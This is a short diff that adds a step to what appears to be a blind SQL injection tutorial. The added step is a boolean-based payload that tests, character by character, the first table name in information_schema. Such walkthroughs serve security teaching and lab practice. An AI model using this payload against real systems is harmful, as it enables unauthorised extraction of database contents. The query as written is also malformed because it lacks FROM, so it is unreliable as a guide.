@@ -299,6 +299,13 @@ Now we start to enumerate the database. The query is
 
 and we see a message you are in.......
 
+It means true.
+
+Now let us try value 101:
+
+**id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –+**
+
+
 
 
 
